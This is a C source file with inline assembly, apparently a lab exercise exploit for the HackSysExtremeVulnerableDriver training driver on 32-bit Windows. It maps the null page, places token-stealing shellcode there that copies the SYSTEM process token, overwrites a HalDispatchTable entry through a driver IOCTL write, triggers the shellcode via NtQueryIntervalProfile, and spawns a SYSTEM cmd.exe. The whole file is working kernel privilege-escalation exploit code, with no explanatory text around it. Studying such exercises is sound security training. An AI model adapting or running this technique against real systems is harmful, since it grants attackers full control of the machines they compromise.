#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
HANDLE hDriver;
DWORD dw;
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);
typedef NTSTATUS
(NTAPI* _NtAllocateVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect);
_NtAllocateVirtualMemory NtAllocateVirtualMemory;
VOID ShellCode()
{
	__asm
	{
		//int 3
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		findpid :
		mov eax, [eax + 0b8h]
		sub eax, 0b8h
		cmp[eax + 0b4h], edx
		jnz findpid

		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
		ret
	}
}
int main() {
	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE hDevice;
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return -1;
	}
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	PVOID UserBase = 0;
	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameW(lpImageBase[i], lpfileName, 48);
		UserBase = lpImageBase[0];
		break;
	}
	HMODULE nbase = LoadLibraryA("ntkrnlpa.exe");
	printf("UserBase=%x\n", UserBase);
	printf("nbase=%x\n", nbase);
	DWORD Interval = 0;
	PVOID HalDispatchTable = GetProcAddress(nbase, "HalDispatchTable");
	printf("HalDispatchTable=%x\n", HalDispatchTable);
	HalDispatchTable = (PVOID)((ULONG)HalDispatchTable + (ULONG)UserBase - (ULONG)nbase);

	printf("%x\n", HalDispatchTable);
	LPCSTR nt = "ntdll";
	HMODULE hntdll = GetModuleHandleA(nt);
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress((HMODULE)hntdll, "NtAllocateVirtualMemory");

	if (!NtAllocateVirtualMemory) {
		printf("[-] Fail to resolve NtAllocateVirtualMemory(0x%X)\n", GetLastError());
		system("pause");
	}

	printf("[+] Started to alloc zero page\n");
	PVOID addr = (PVOID)0x1;
	DWORD size = 0x1000;
	if (!NT_SUCCESS(NtAllocateVirtualMemory(HANDLE(-1),
		&addr,
		0,
		&size,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE)) || addr != 0)
	{
		printf("[-]GetLastError=%x", GetLastError());
		getchar();
		return -1;
	}
	RtlMoveMemory(0, &ShellCode, 0x100);
	ULONG buf[1];
	buf[0] = ((ULONG)HalDispatchTable + 4);
	DeviceIoControl(hDriver, 0x222047, buf, 4, 0, 0, &dw, NULL);
	NtQueryIntervalProfile FNtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	int NtStatus = FNtQueryIntervalProfile(
		2, // Source
		&Interval);// Interval
	if (NtStatus)
	{
		printf("NtQueryIntervalProfile failed! NtStatus=%.8X\n", NtStatus);
		getchar();
		return -1;
	}

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	return 0;
}
